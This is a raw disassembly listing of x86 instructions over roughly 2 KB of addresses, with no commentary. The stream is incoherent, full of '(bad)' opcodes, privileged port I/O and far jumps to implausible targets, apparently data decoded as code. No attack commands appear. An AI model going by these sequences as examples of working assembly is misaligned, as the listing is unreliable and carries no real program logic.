  402225:	lods   al,BYTE PTR ds:[esi]
  402226:	ins    BYTE PTR es:[edi],dx
  402227:	mov    cs,WORD PTR [edx+eiz*8]
  40222a:	inc    eax
  40222b:	movlps xmm4,QWORD PTR [eax+edx*1]
  40222f:	pop    eax
  402230:	ret    0xa097
  402233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402234:	mov    ds:0xb2c2c0df,al
  402239:	xchg   edi,eax
  40223a:	xchg   esi,eax
  40223b:	rcr    DWORD PTR [ebx],1
  40223d:	loopne 0x4021e0
  40223f:	imul   ebp,eax,0x1b070092
  402245:	pop    ebp
  402246:	pop    ebx
  402247:	sub    BYTE PTR [eax],dl
  402249:	xor    ebp,esp
  40224b:	mov    cl,dl
  40224d:	(bad)  
  40224e:	out    dx,al
  40224f:	push   edi
  402250:	jns    0x402295
  402252:	in     eax,0xf2
  402254:	ss jecxz 0x4022b8
  402257:	dec    edx
  402258:	xchg   ebp,eax
  402259:	xor    DWORD PTR [edi],edi
  40225b:	xchg   ebx,eax
  40225c:	xor    BYTE PTR [ecx+ebx*8],dl
  40225f:	(bad)  
  402261:	adc    ebx,DWORD PTR [ebx+0x3e]
  402264:	dec    eax
  402265:	and    al,0x7b
  402267:	pop    esi
  402268:	test   al,0x2e
  40226a:	pop    es
  40226b:	repnz mov ch,0x14
  40226e:	xor    eax,0x2ba48d51
  402273:	mov    BYTE PTR [ecx-0x5d],bl
  402276:	call   0xf9d6919
  40227b:	xchg   esi,eax
  40227c:	call   0xfeb8:0x404f6924
  402283:	mov    bl,0x62
  402285:	dec    esi
  402286:	ficom  DWORD PTR [ecx+esi*2]
  402289:	sub    bh,BYTE PTR [edx+ebp*4]
  40228c:	(bad)  
  40228d:	repnz inc ecx
  40228f:	in     eax,dx
  402290:	ret    
  402291:	cmp    eax,0xf1f5b7b8
  402296:	out    0x8f,eax
  402298:	cdq    
  402299:	inc    ebp
  40229a:	shl    ebx,1
  40229c:	pop    ss
  40229d:	jo     0x4022d4
  40229f:	push   esi
  4022a0:	aas    
  4022a1:	in     eax,0x38
  4022a3:	mov    ecx,0x5e3cd204
  4022a8:	retf   0x9c7b
  4022ab:	pop    es
  4022ac:	mov    ebp,0x9a591b16
  4022b1:	test   DWORD PTR [ecx+0x18],ebp
  4022b4:	dec    edi
  4022b5:	shr    ah,cl
  4022b7:	pop    ebx
  4022b8:	mov    ds:0xc43f1e9e,eax
  4022bd:	out    dx,eax
  4022be:	popa   
  4022bf:	arpl   bp,si
  4022c1:	push   esi
  4022c2:	mov    ds:0xa4b5f0ab,al
  4022c7:	iret   
  4022c8:	shr    BYTE PTR [ebx-0x7af2f3bf],cl
  4022ce:	sub    eax,0x9f7bd0f1
  4022d3:	dec    edi
  4022d4:	sar    BYTE PTR [ebx],1
  4022d6:	add    DWORD PTR [esp+edi*1+0x58],edx
  4022da:	pushf  
  4022db:	inc    ebp
  4022dc:	daa    
  4022dd:	in     eax,dx
  4022de:	or     al,0x31
  4022e0:	pusha  
  4022e1:	jno    0x4022cf
  4022e3:	mov    cl,0x24
  4022e5:	pop    ebp
  4022e6:	das    
  4022e7:	test   BYTE PTR [edi-0x19],cl
  4022ea:	jns    0x402276
  4022ec:	sti    
  4022ed:	pop    edx
  4022ee:	xchg   edi,edx
  4022f0:	inc    esi
  4022f1:	mov    ds:0x32415f25,eax
  4022f6:	pop    edx
  4022f7:	aad    0x19
  4022f9:	and    BYTE PTR [edx],dh
  4022fb:	push   0x65969310
  402300:	aam    0x7c
  402302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402303:	xor    ebp,DWORD PTR [eax+ebp*2]
  402306:	inc    ebx
  402307:	or     bl,BYTE PTR [edx-0xc]
  40230a:	adc    ah,BYTE PTR [eax+eiz*1-0x76]
  40230e:	inc    edi
  40230f:	add    al,0x3
  402311:	pop    edx
  402312:	adc    eax,0xd57fabb1
  402317:	jmp    0x4aed:0xe46d59ed
  40231e:	mov    ebp,0x2f5088e8
  402323:	repz call DWORD PTR [ebx+ecx*4-0x48]
  402328:	bound  ebp,QWORD PTR [edi]
  40232a:	mov    bh,0xa
  40232c:	je     0x4022e3
  40232e:	int    0x22
  402330:	dec    eax
  402331:	dec    edx
  402332:	dec    eax
  402333:	neg    DWORD PTR [edx-0x72]
  402336:	mov    ah,0x47
  402338:	cld    
  402339:	pop    esp
  40233a:	imul   ebp,esp,0x2d147610
  402340:	in     eax,0xe
  402342:	js     0x40235d
  402344:	xchg   esp,eax
  402345:	aaa    
  402346:	add    eax,0x2c8029f5
  40234b:	sub    eax,0xc81c69a9
  402350:	jmp    0x95795e4a
  402355:	retf   0x9e73
  402358:	jg     0x402380
  40235a:	lods   eax,DWORD PTR ds:[esi]
  40235b:	sbb    eax,0xcd1d7fcc
  402360:	mov    ebx,0x8ffb674b
  402365:	in     eax,dx
  402366:	lock call 0xac63:0xe784f94d
  40236e:	sub    bh,BYTE PTR [ebp+0x6bdb16bb]
  402374:	or     esp,DWORD PTR [ebp+0x48a39c68]
  40237a:	mov    esp,DWORD PTR [eax]
  40237c:	daa    
  40237d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40237e:	out    dx,eax
  40237f:	retf   
  402380:	cmp    DWORD PTR [esp+ecx*1],ebp
  402383:	jecxz  0x402373
  402385:	dec    ecx
  402386:	dec    eax
  402387:	add    ecx,esi
  402389:	push   es
  40238a:	clc    
  40238b:	std    
  40238c:	sub    eax,0xf9e08601
  402391:	mul    BYTE PTR [ecx+0x54]
  402394:	jge    0x4023c0
  402396:	adc    ecx,edi
  402398:	pop    ebx
  402399:	fs push esi
  40239b:	sub    bh,BYTE PTR [ecx+0x1276d04e]
  4023a1:	jnp    0x4023b0
  4023a3:	cld    
  4023a4:	aaa    
  4023a5:	sbb    ebx,DWORD PTR [edx+0x1cd8c909]
  4023ab:	mov    cs,WORD PTR [eax+0x2]
  4023ae:	int3   
  4023af:	jecxz  0x40240e
  4023b1:	fcmovne st,st(6)
  4023b3:	pop    ds
  4023b4:	pop    edi
  4023b5:	loopne 0x402393
  4023b7:	aam    0x37
  4023b9:	xchg   ebx,eax
  4023ba:	(bad)  
  4023bb:	push   edx
  4023bc:	add    eax,0x8a93ca00
  4023c1:	and    bh,BYTE PTR [ebx+0x4c7e471a]
  4023c7:	mov    ecx,0x11ceb26e
  4023cc:	mov    ah,0x41
  4023ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023cf:	or     ebp,esp
  4023d1:	xor    eax,0x7feae37e
  4023d6:	push   ebx
  4023d7:	xchg   ebp,eax
  4023d8:	sub    al,0xf9
  4023da:	xor    al,0xd0
  4023dc:	mov    dh,0x4a
  4023de:	and    BYTE PTR [edx-0x46a5009c],ah
  4023e4:	and    ah,BYTE PTR [edx-0xad26ec7]
  4023ea:	fs mov al,0x38
  4023ed:	rol    DWORD PTR [eax+0x1223e923],cl
  4023f3:	dec    ebx
  4023f4:	pop    eax
  4023f5:	pushf  
  4023f6:	jle    0x402429
  4023f8:	cmp    eax,0xedfef2be
  4023fd:	pop    eax
  4023fe:	call   0xa7d1:0x7aee507e
  402405:	mov    ebx,0x11b6aff3
  40240a:	mov    dh,0x47
  40240c:	cmp    BYTE PTR [eax],0x21
  40240f:	outs   dx,BYTE PTR ds:[esi]
  402410:	in     al,dx
  402411:	mov    dh,0x2
  402413:	adc    al,0xd3
  402415:	aad    0x31
  402417:	leave  
  402418:	or     ebp,0xed1f2b37
  40241e:	mov    ebp,0x8a386a02
  402423:	je     0x4023c3
  402425:	add    eax,0xb1b803f
  40242a:	mov    ebx,0x6dd09a5e
  40242f:	pop    esi
  402430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402431:	fistp  DWORD PTR [eax]
  402433:	test   BYTE PTR [edi-0x63],dl
  402436:	xchg   DWORD PTR [edx-0x3e],eax
  402439:	arpl   di,di
  40243b:	loopne 0x4024a4
  40243d:	mov    esi,0xdda2bec2
  402442:	rol    BYTE PTR es:[eax-0x3d3ecad8],0x1f
  40244a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40244b:	mov    edi,0x902cb57b
  402450:	fidivr DWORD PTR [esi-0x11]
  402453:	gs jecxz 0x402414
  402456:	retf   0xefa6
  402459:	dec    esp
  40245a:	leave  
  40245b:	push   ecx
  40245c:	mov    edx,0x3fc156b7
  402461:	gs jo  0x402468
  402464:	retf   
  402465:	mov    esp,0x721330f8
  40246a:	ds mov cl,0x71
  40246d:	and    DWORD PTR [ecx+0x9],0x18785a04
  402474:	loope  0x402497
  402476:	xor    eax,0x54c2425f
  40247b:	fstp   TBYTE PTR [edi]
  40247d:	icebp  
  40247e:	in     eax,dx
  40247f:	call   0x30dad48a
  402484:	or     ebx,DWORD PTR cs:[ecx+0x386c7a06]
  40248b:	in     al,dx
  40248c:	dec    ebp
  40248d:	scas   eax,DWORD PTR es:[edi]
  40248e:	mov    esi,0xa65b3c8
  402493:	push   eax
  402494:	dec    esi
  402495:	fstp   TBYTE PTR [eax-0x489f82ea]
  40249b:	xchg   BYTE PTR cs:[eax],al
  40249e:	ret    0xc5fb
  4024a1:	repz push es
  4024a3:	daa    
  4024a4:	mov    bh,0xdd
  4024a6:	jbe    0x4024e6
  4024a8:	pandn  mm7,QWORD PTR [esi]
  4024ab:	in     al,0x7d
  4024ad:	or     edi,eax
  4024af:	xor    DWORD PTR [edi-0x44278b6b],esi
  4024b5:	mov    bh,BYTE PTR [edi-0x64a5124c]
  4024bb:	jmp    0x32a2:0x3a9c7eda
  4024c2:	shl    BYTE PTR [ebx-0x39c20d47],cl
  4024c8:	pop    ss
  4024c9:	push   ds
  4024ca:	adc    dl,BYTE PTR [ecx]
  4024cc:	mov    dl,0xc4
  4024ce:	dec    esi
  4024cf:	(bad)  
  4024d0:	fcomp  QWORD PTR [ebx]
  4024d2:	pop    es
  4024d3:	cmp    BYTE PTR [edi],ah
  4024d5:	adc    bl,dl
  4024d7:	inc    edi
  4024d8:	xor    bh,dh
  4024da:	mov    ecx,edi
  4024dc:	mov    cl,0x81
  4024de:	dec    edi
  4024df:	dec    ebp
  4024e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024e1:	les    ecx,FWORD PTR [edx+eiz*8+0x6d]
  4024e5:	pop    ecx
  4024e6:	in     al,dx
  4024e7:	xor    ebx,DWORD PTR [esi-0x3]
  4024ea:	cmp    DWORD PTR [esi+0x2],ebp
  4024ed:	add    eax,0xdea190b1
  4024f2:	sbb    DWORD PTR [edx],esi
  4024f4:	cmp    al,0xcb
  4024f6:	inc    edx
  4024f7:	mov    dl,0x1a
  4024f9:	mov    ds:0x1aeaac88,eax
  4024fe:	pop    ecx
  4024ff:	pop    edx
  402500:	out    0xce,al
  402502:	pushf  
  402503:	pop    edx
  402504:	sub    al,0x2
  402506:	pop    edi
  402507:	inc    esp
  402508:	pop    ds
  402509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40250a:	pushf  
  40250b:	stc    
  40250c:	adc    BYTE PTR [edx],ah
  40250e:	jp     0x4024aa
  402510:	sbb    ah,al
  402512:	hlt    
  402513:	fdivr  st(3),st
  402515:	sete   al
  402518:	repnz and dh,BYTE PTR [ebp+0x47]
  40251c:	xor    edx,0x206db58a
  402522:	mov    ebp,eax
  402524:	(bad)  
  402525:	lods   al,BYTE PTR ds:[esi]
  402526:	pop    ss
  402527:	inc    esp
  402528:	stc    
  402529:	mov    dh,ch
  40252b:	ds push cs
  40252d:	xchg   ecx,eax
  40252e:	or     eax,0xf449f820
  402533:	retf   
  402534:	out    dx,eax
  402535:	cmp    bl,BYTE PTR [edi]
  402537:	shl    BYTE PTR [ebx+0x1d],1
  40253a:	add    DWORD PTR [edi+0x23],0xa58e37ee
  402541:	lahf   
  402542:	or     BYTE PTR [edi-0x59],dh
  402545:	xchg   cl,ah
  402547:	push   es
  402548:	aad    0x31
  40254a:	mov    eax,ds:0x80070865
  40254f:	or     BYTE PTR [ecx],bl
  402551:	lahf   
  402552:	pop    esp
  402553:	sub    DWORD PTR [eax],ebx
  402555:	push   eax
  402556:	popa   
  402557:	add    eax,0xf54558e4
  40255c:	lea    edi,[ecx]
  40255e:	enter  0xd6b5,0x1f
  402562:	data16 (bad) 
  402564:	fmul   QWORD PTR [edx+0x51106c81]
  40256a:	leave  
  40256b:	fidivr WORD PTR [ebx]
  40256d:	mov    edi,0x67cbb71
  402572:	retf   
  402573:	jl     0x402585
  402575:	cld    
  402576:	add    DWORD PTR [ebp-0x3d8c6f30],eax
  40257c:	(bad)  
  40257d:	mov    eax,0xa77a138b
  402582:	mov    dl,0x38
  402584:	call   0xb4bfee15
  402589:	(bad)  
  40258a:	xor    eax,edi
  40258c:	or     al,0x44
  40258f:	loopne 0x4025ec
  402591:	xor    DWORD PTR [edi+ebx*1-0x72],ebx
  402595:	push   0xad62c0f7
  40259a:	ins    BYTE PTR es:[edi],dx
  40259b:	lahf   
  40259c:	xor    ah,ch
  40259e:	fwait
  40259f:	xor    eax,0x501c5363
  4025a4:	adc    DWORD PTR fs:[ecx],0x2803c520
  4025ab:	iret   
  4025ac:	pop    ecx
  4025ad:	xlat   BYTE PTR ds:[ebx]
  4025ae:	jae    0x402625
  4025b0:	push   0xbc9af964
  4025b5:	shr    DWORD PTR [edx-0x77],cl
  4025b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025b9:	rcr    DWORD PTR [ebx-0x14d004b0],0x42
  4025c0:	xchg   edx,eax
  4025c1:	mov    edi,0x1a4bcdb2
  4025c6:	adc    al,0xad
  4025c8:	sbb    DWORD PTR [edi-0x23],edi
  4025cb:	sahf   
  4025cc:	push   ebp
  4025cd:	jmp    0x77f:0x339ce2f2
  4025d4:	inc    edi
  4025d5:	cmp    ah,BYTE PTR [eax+0x154b2147]
  4025db:	aam    0xc1
  4025dd:	bound  edx,QWORD PTR [ebx+0x61]
  4025e0:	xchg   DWORD PTR [edx+0xf1d6f3b],ebp
  4025e6:	and    bh,BYTE PTR [ecx-0x9]
  4025e9:	inc    edi
  4025ea:	mov    ch,0x29
  4025ec:	jae    0x40257c
  4025ee:	mov    ss,WORD PTR [edx]
  4025f0:	inc    ebp
  4025f1:	jmp    0x40262a
  4025f3:	aad    0x4d
  4025f5:	add    ah,BYTE PTR [ebp+0x6f]
  4025f8:	adc    DWORD PTR [esi+0x3148e41],edi
  4025fe:	test   edi,0x84d944d6
  402604:	pop    esp
  402605:	pushf  
  402606:	stc    
  402607:	(bad)  
  402608:	out    dx,eax
  402609:	push   cs
  40260a:	jmp    0xb4d7c049
  40260f:	jl     0x40265f
  402611:	xor    al,0xd
  402613:	fs xchg esi,eax
  402615:	imul   esi,DWORD PTR [edi+0x11],0xb9ce434c
  40261c:	add    edi,DWORD PTR [esi]
  40261e:	cmp    eax,0xabef67d3
  402623:	push   edi
  402624:	push   es
  402625:	outs   dx,BYTE PTR ds:[esi]
  402626:	repnz inc eax
  402628:	push   cs
  402629:	add    BYTE PTR [edi],dh
  40262b:	int3   
  40262c:	sti    
  40262d:	in     eax,dx
  40262e:	push   edx
  40262f:	mov    edx,DWORD PTR [ebx-0x39]
  402632:	aaa    
  402633:	push   ss
  402634:	sub    DWORD PTR [edi-0x1c1d13ec],esp
  40263a:	and    BYTE PTR ds:0x68cf0531,0x64
  402641:	mov    edx,0x413901b7
  402646:	sahf   
  402647:	lods   al,BYTE PTR ds:[esi]
  402648:	pusha  
  402649:	pop    ecx
  40264a:	pushf  
  40264b:	fwait
  40264c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40264d:	adc    al,0xc
  40264f:	arpl   WORD PTR [esi+0x6ff85538],sp
  402655:	mov    ds:0x9b92e7b,al
  40265a:	mov    al,BYTE PTR [esi-0x18]
  40265d:	xchg   DWORD PTR ds:0x6994336a,ecx
  402663:	(bad)  
  402664:	adc    eax,0x2c3eb359
  402669:	outs   dx,BYTE PTR ds:[esi]
  40266a:	hlt    
  40266b:	mov    edx,0xa618a88
  402670:	out    dx,al
  402671:	pop    edi
  402672:	xchg   edx,eax
  402673:	mov    bl,0x39
  402675:	imul   ebx,DWORD PTR [ebp-0x11],0xc125b883
  40267c:	dec    ebx
  40267d:	ret    
  40267e:	ins    BYTE PTR es:[edi],dx
  40267f:	sub    bl,ch
  402681:	pop    esp
  402682:	xchg   esp,eax
  402683:	ror    BYTE PTR [edi+0x5b],1
  402686:	jne    0x4026db
  402688:	sti    
  402689:	sbb    eax,0x91b5135e
  40268e:	es jb  0x4026d0
  402691:	dec    ebx
  402692:	loopne 0x4026ea
  402694:	or     DWORD PTR [ecx-0x66],esi
  402697:	in     al,dx
  402698:	ins    DWORD PTR es:[edi],dx
  402699:	div    BYTE PTR [ebp+0x47]
  40269c:	mov    ds:0xc1105085,eax
  4026a1:	ret    
  4026a2:	or     eax,0xcb1d1e
  4026a7:	mov    sp,0xc85
  4026ab:	sub    al,0x79
  4026ad:	or     DWORD PTR [ecx-0x5238ba30],0xffffff95
  4026b4:	ds mov gs,edx
  4026b7:	and    al,0xe1
  4026b9:	pop    ecx
  4026ba:	pushf  
  4026bb:	mov    dl,0x5
  4026bd:	sbb    ch,BYTE PTR [eax+0x11]
  4026c0:	pop    ebp
  4026c1:	mov    BYTE PTR [edi+edx*1],ch
  4026c4:	inc    ecx
  4026c5:	and    edi,edi
  4026c7:	lods   al,BYTE PTR ds:[esi]
  4026c8:	xor    DWORD PTR [esi+0x7d],eax
  4026cb:	outs   dx,BYTE PTR ds:[esi]
  4026cc:	int3   
  4026cd:	icebp  
  4026ce:	push   esp
  4026cf:	mov    eax,DWORD PTR [eax+0x4e]
  4026d2:	sbb    al,0x88
  4026d4:	retf   
  4026d5:	pop    ds
  4026d6:	and    ecx,DWORD PTR [edx]
  4026d8:	xor    al,0xe1
  4026da:	and    ch,BYTE PTR [ecx+eax*2+0x39]
  4026de:	aam    0x57
  4026e0:	mov    bl,0x4
  4026e2:	xchg   edx,eax
  4026e3:	dec    eax
  4026e4:	push   esi
  4026e5:	mov    ds:0x4b6121c5,al
  4026ea:	push   ecx
  4026eb:	into   
  4026ec:	call   0xd666810c
  4026f1:	inc    edx
  4026f2:	xchg   edx,eax
  4026f3:	mov    bl,BYTE PTR [eax-0x2dd73ea9]
  4026f9:	add    bh,BYTE PTR [eax+eax*1+0x1a65fe69]
  402700:	test   al,0x5a
  402702:	dec    eax
  402703:	(bad)  
  402704:	scas   eax,DWORD PTR es:[edi]
  402705:	dec    ebp
  402706:	arpl   bp,cx
  402708:	xchg   ecx,eax
  402709:	leave  
  40270a:	in     al,dx
  40270b:	in     al,0x60
  40270d:	cdq    
  40270e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40270f:	sub    DWORD PTR [esi-0x5e098a58],esi
  402715:	sahf   
  402716:	adc    BYTE PTR [eax+0x16a8fc5c],dh
  40271c:	cli    
  40271d:	push   ecx
  40271e:	dec    ebx
  40271f:	dec    ecx
  402720:	adc    ah,BYTE PTR [eax+0x7bbc9f7b]
  402726:	mov    cl,0x2b
  402728:	push   ecx
  402729:	mov    al,ds:0xec7a81dd
  40272e:	inc    ebp
  40272f:	add    eax,0xd78b7577
  402734:	xor    esi,edx
  402736:	sahf   
  402737:	data16 repnz mov WORD PTR [edx+0x21],fs
  40273c:	jmp    DWORD PTR [edi]
  40273e:	jmp    0xca155b0d
  402743:	fnsave [esi-0x2421d42c]
  402749:	and    al,0xe1
  40274b:	push   ds
  40274c:	ret    
  40274d:	fsub   DWORD PTR [eax-0x146b98c]
  402753:	mov    dl,0xbd
  402755:	push   ds
  402756:	enter  0x7165,0xd8
  40275a:	stos   DWORD PTR es:[edi],eax
  40275b:	cli    
  40275c:	lahf   
  40275d:	or     bl,BYTE PTR [ebx-0x8]
  402760:	or     al,0xa6
  402762:	jmp    0x402707
  402764:	stc    
  402765:	nop
  402766:	pop    ecx
  402767:	push   esp
  402768:	sbb    ebx,ebp
  40276a:	mul    DWORD PTR [edx-0x4fc4d06e]
  402770:	lds    edx,FWORD PTR [esi+0x1e]
  402773:	push   es
  402774:	push   ecx
  402775:	bound  ecx,QWORD PTR [eax]
  402777:	mov    ds:0x58b0d686,al
  40277c:	add    eax,0x3e48e34
  402781:	lahf   
  402782:	push   edx
  402783:	retf   0xe339
  402786:	dec    ecx
  402787:	inc    eax
  402788:	mov    dh,bh
  40278a:	retf   0xf8db
  40278d:	jle    0x402723
  40278f:	mov    DWORD PTR [eax+0x1cc30f4a],edx
  402795:	cmp    ah,BYTE PTR [edi+eiz*8+0x23]
  402799:	pusha  
  40279a:	adc    ah,BYTE PTR [edx]
  40279c:	push   esp
  40279d:	push   esi
  40279e:	lods   eax,DWORD PTR ds:[esi]
  40279f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027a0:	sub    eax,0xca502a0d
  4027a5:	iret   
  4027a6:	cmp    edi,DWORD PTR [edi+0x5a]
  4027a9:	xor    BYTE PTR [edi+0x658c487c],0x2d
  4027b0:	add    BYTE PTR [ebx-0x29a34828],0x8d
  4027b7:	fimul  WORD PTR [ecx-0x4d2ee329]
  4027bd:	or     BYTE PTR [edx],al
  4027bf:	aad    0xee
  4027c1:	in     eax,dx
  4027c2:	imul   edx,DWORD PTR [edx+0x5cd8d862],0xa8617604
  4027cc:	cmc    
  4027cd:	ins    BYTE PTR es:[edi],dx
  4027ce:	std    
  4027cf:	xchg   ecx,eax
  4027d0:	sbb    DWORD PTR [ecx+0x6145113c],esp
  4027d6:	(bad)  
  4027d7:	int3   
  4027d8:	xchg   esi,eax
  4027d9:	dec    ebp
  4027da:	stos   BYTE PTR es:[edi],al
  4027db:	pop    es
  4027dc:	cmc    
  4027dd:	mov    ebp,0x9f5b679d
  4027e2:	push   ds
  4027e3:	ss out 0xab,eax
  4027e6:	and    dl,BYTE PTR [esi+0x9]
  4027e9:	xor    eax,edx
  4027eb:	dec    ecx
  4027ec:	jmp    0x7a35:0x43cfb8ef
  4027f3:	jge    0x402869
  4027f5:	mov    bl,0x92
  4027f7:	sbb    edx,0x6b3011ab
  4027fd:	adc    DWORD PTR [ebx+ebp*2-0x59363102],edi
  402804:	popa   
  402805:	pop    esp
  402806:	outs   dx,DWORD PTR ds:[esi]
  402807:	jmp    0x194fad77
  40280c:	mov    DWORD PTR [ebx-0x15],ebx
  40280f:	mov    al,0x8c
  402811:	call   0x5ef7f5eb
  402816:	out    dx,eax
  402817:	shl    DWORD PTR [esp+esi*4-0x1f],1
  40281b:	mov    ds,WORD PTR [eax]
  40281d:	sahf   
  40281e:	jl     0x40283f
  402820:	jl     0x40287c
  402822:	stos   BYTE PTR es:[edi],al
  402823:	or     al,0xc6
  402825:	jne    0x4027ed
  402827:	test   al,0x35
  402829:	bound  esp,QWORD PTR [esi-0x552730ac]
  40282f:	cmc    
  402830:	fmul   st,st(5)
  402832:	sbb    eax,0x6bf8756b
  402837:	loope  0x4027fd
  402839:	(bad)  [ebp-0x5487682f]
  40283f:	dec    ecx
  402840:	pop    ebx
  402841:	out    dx,al
  402842:	xlat   BYTE PTR ds:[ebx]
  402843:	int3   
  402844:	add    eax,0xdccb8d7b
  402849:	xor    bl,BYTE PTR [edi+0x1d]
  40284c:	jle    0x402864
  40284e:	xlat   BYTE PTR ds:[ebx]
  40284f:	xor    eax,0x49438b1f
  402854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402855:	or     al,0xb3
  402857:	loop   0x402891
  402859:	es clc 
  40285b:	mov    al,0xbd
  40285d:	iret   
  40285e:	(bad)  
  402860:	mov    bl,0xf
  402862:	add    bl,BYTE PTR [eax-0x54e7b046]
  402868:	pop    ss
  402869:	sbb    DWORD PTR [edi],ecx
  40286b:	shr    BYTE PTR [esi-0x71],1
  40286e:	or     al,BYTE PTR [ebx-0x501a9132]
  402874:	xchg   edx,eax
  402875:	in     eax,0xff
  402877:	add    bh,al
  402879:	dec    eax
  40287a:	scas   al,BYTE PTR es:[edi]
  40287b:	xchg   edi,eax
  40287c:	mov    dh,BYTE PTR [ecx-0x39]
  40287f:	sub    ah,BYTE PTR [eax]
  402881:	mov    edi,0xee3dd66d
  402886:	or     eax,0xe52a74ab
  40288b:	adc    eax,0x235a477b
  402890:	mov    edi,0xfb3c4b9a
  402895:	inc    ebx
  402896:	sbb    eax,edi
  402898:	sti    
  402899:	mov    esi,0x67b48178
  40289e:	dec    esp
  40289f:	bound  edx,QWORD PTR [eax+0x77]
  4028a2:	jbe    0x402907
  4028a4:	(bad)  
  4028a5:	nop
  4028a6:	mov    ch,0x34
  4028a8:	mov    al,0x35
  4028aa:	dec    ebp
  4028ab:	xor    DWORD PTR [edi+0x44],edx
  4028ae:	jbe    0x4028ff
  4028b0:	in     eax,0xd
  4028b2:	in     eax,0x8b
  4028b4:	mov    ah,0x3d
  4028b6:	and    cl,dh
  4028b8:	sti    
  4028b9:	repz in al,dx
  4028bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028bc:	sbb    al,0x3e
  4028be:	and    DWORD PTR [ecx-0x3c],edx
  4028c1:	cli    
  4028c2:	retf   0x9c95
  4028c5:	xor    dh,BYTE PTR [edi+0x5112063]
  4028cb:	aaa    
  4028cc:	mov    ah,0x33
  4028ce:	adc    cl,0x4b
  4028d1:	shl    DWORD PTR [esi-0x21],1
  4028d4:	jnp    0x4028e5
  4028d6:	push   DWORD PTR [edi]
  4028d8:	cmp    ebp,DWORD PTR [ecx-0x75fa6118]
  4028de:	pop    esi
  4028df:	ficomp WORD PTR [edx]
  4028e1:	fmul   DWORD PTR [ecx]
  4028e3:	or     ah,ah
  4028e5:	dec    edi
  4028e6:	mov    eax,0x19ae6dd
  4028eb:	adc    ebx,DWORD PTR [edi-0xe7d049d]
  4028f1:	and    eax,0x7fcb7d83
  4028f6:	lea    ebx,[ecx-0x557ddbbe]
  4028fc:	sti    
  4028fd:	inc    edx
  4028fe:	mov    ch,0x1b
  402900:	psadbw mm2,QWORD PTR [esi]
  402903:	xor    al,0x46
  402905:	jmp    0x90cf23ad
  40290a:	jae    0x4028d4
  40290c:	push   esp
  40290d:	xchg   BYTE PTR [ecx],bl
  40290f:	mov    ebx,0x1960f2ed
  402914:	jb     0x40296f
  402916:	push   edi
  402917:	das    
  402918:	push   edi
  402919:	or     eax,0x8bf92a51
  40291e:	inc    ebp
  40291f:	mov    al,ds:0x9be5209
  402924:	dec    eax
  402925:	sti    
  402926:	mov    es,ebx
  402928:	int3   
  402929:	stc    
  40292a:	ss jl  0x402959
  40292d:	mov    ch,0xd5
  40292f:	jmp    0x402974
  402931:	(bad)  
  402933:	repnz aas 
  402935:	push   ds
  402936:	xchg   edi,eax
  402937:	mov    esp,DWORD PTR [edi-0x7fa03fe1]
  40293d:	xchg   esp,esi
  40293f:	jmp    0x4028d0
  402941:	fdiv   DWORD PTR [eax]
  402943:	cmc    
  402944:	test   DWORD PTR [ebx-0x13120186],esi
  40294a:	mov    eax,ds:0x2ef9f0e3
  40294f:	jo     0x402935
  402951:	push   esi
  402952:	pop    edi
  402953:	(bad)  
  402954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402955:	mov    cl,0x4
  402957:	pusha  
  402958:	mov    cl,0xaa
  40295a:	pop    ss
  40295b:	adc    DWORD PTR [ecx-0x26],0xffffffea
  40295f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402960:	outs   dx,DWORD PTR ds:[esi]
  402961:	mov    dh,0x57
  402963:	mov    esi,0x6958930f
  402968:	adc    DWORD PTR [ecx-0x756fa48],esp
  40296e:	popf   
  40296f:	and    BYTE PTR [edi],al
  402971:	(bad)  
  402972:	fidivr DWORD PTR [ecx+ebp*2-0x502aca39]
  402979:	sbb    eax,0xe0836685
  40297e:	stos   BYTE PTR es:[edi],al
  40297f:	bound  esp,QWORD PTR [ecx-0x2f]
  402982:	je     0x402916
  402984:	jae    0x4029d2
  402986:	aaa    
  402987:	dec    esi
  402988:	sbb    eax,0x4c404608
  40298d:	or     al,0x18
  40298f:	pop    ds
  402990:	sbb    dl,bh
  402992:	int    0xe1
  402994:	imul   esp,DWORD PTR [ecx+0x50],0x3544c0cf
  40299b:	sahf   
  40299c:	inc    eax
  40299d:	out    dx,al
  40299e:	and    al,0xc3
  4029a0:	ror    DWORD PTR [edx+0x12],cl
  4029a3:	dec    edx
  4029a4:	ret    0x6586
  4029a7:	push   edx
  4029a8:	test   eax,0x433d9c0b
  4029ad:	pop    DWORD PTR [ecx-0x22643592]
  4029b3:	ds pop ss
  4029b5:	ret    
  4029b6:	mov    gs:0x80567d87,eax
  4029bc:	xchg   ebx,eax
  4029bd:	lock iret 
  4029bf:	lea    esp,ds:0x7b322b5d
  4029c5:	jno    0x402a0c
  4029c7:	xchg   DWORD PTR [edx+0x65],edx
  4029ca:	cli    
  4029cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029cc:	jnp    0x4029fb
  4029ce:	mov    al,0x3d
  4029d1:	(bad)  
  4029d2:	cmp    esi,DWORD PTR [esi+0x40]
  4029d5:	sub    al,BYTE PTR [ebx-0xe]
  4029d8:	out    0xc,eax
  4029da:	enter  0xbf66,0x7
  4029de:	sub    BYTE PTR [ecx+edx*4+0x1fa201eb],bl
  4029e5:	pop    edi
  4029e6:	mov    cl,0x1b
  4029e8:	in     eax,0x42
  4029ea:	sbb    eax,DWORD PTR [edi-0x328cd170]
  4029f0:	mov    ah,0x5f
  4029f2:	ja     0x402990
  4029f4:	clc    
  4029f5:	stos   DWORD PTR es:[edi],eax
  4029f6:	div    esi
  4029f8:	and    eax,0x48793ce0
  4029fd:	ret    0x91ee
  402a00:	in     al,dx
